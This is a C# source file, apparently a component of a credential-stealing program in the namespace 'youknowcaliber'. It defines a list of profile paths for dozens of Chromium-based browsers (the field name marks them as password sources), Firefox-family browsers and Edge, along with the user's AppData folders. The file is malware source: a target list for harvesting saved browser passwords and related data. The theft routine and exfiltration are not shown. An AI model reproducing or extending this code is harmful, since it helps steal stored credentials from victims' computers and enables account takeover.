using System.IO;

namespace youknowcaliber
{
    internal sealed class Paths
    {
        // Encrypted Chromium browser path's
        public static string[] sChromiumPswPaths =
        {
            @"\Chromium\User Data\", 
            @"\Google\Chrome\User Data\",
            @"\Opera Software\Opera GX Stable\",
            @"\Google(x86)\Chrome\User Data\",
            @"\Opera Software\",
            @"\MapleStudio\ChromePlus\User Data\",
            @"\Iridium\User Data\",
            @"\7Star\7Star\User Data\",
            @"\CentBrowser\User Data\",
            @"\Chedot\User Data\",
            @"\Vivaldi\User Data\",
            @"\Kometa\User Data\",
            @"\Elements Browser\User Data\",
            @"\Epic Privacy Browser\User Data\",
            @"\uCozMedia\Uran\User Data\",
            @"\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer\",
            @"\CatalinaGroup\Citrio\User Data\",
            @"\Coowon\Coowon\User Data\",
            @"\liebao\User Data\",
            @"\QIP Surf\User Data\",
            @"\Orbitum\User Data\",
            @"\Comodo\Dragon\User Data\",
            @"\Amigo\User\User Data\",
            @"\Torch\User Data\",
            @"\Yandex\YandexBrowser\User Data\",
            @"\Comodo\User Data\",
            @"\360Browser\Browser\User Data\",
            @"\Maxthon3\User Data\",
            @"\K-Melon\User Data\",
            @"\Sputnik\Sputnik\User Data\",
            @"\Nichrome\User Data\",
            @"\CocCoc\Browser\User Data\",
            @"\Uran\User Data\",
            @"\Chromodo\User Data\",
            @"\Mail.Ru\Atom\User Data\",
            @"\BraveSoftware\Brave-Browser\User Data\",
        };

        // Encrypted Firefox based browsers path's
        public static string[] sGeckoBrowserPaths = new string[]
        {
            @"\Mozilla\Firefox", // \Mozilla\Firefox
            @"\Waterfox",
            @"\K-Meleon",
            @"\Thunderbird",
            @"\Comodo\IceDragon",
            @"\8pecxstudios\Cyberfox",
            @"\NETGATE Technologies\BlackHaw",
            @"\Moonchild Productions\Pale Moon",
        };

        // Encrypted Edge browser path
        public static string EdgePath = @"\Microsoft\Edge\User Data"; // Microsoft\Edge\User Data

        // Appdata
        public static string appdata = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData);
        public static string lappdata = System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData);

        // Create working directory
      

    }
}
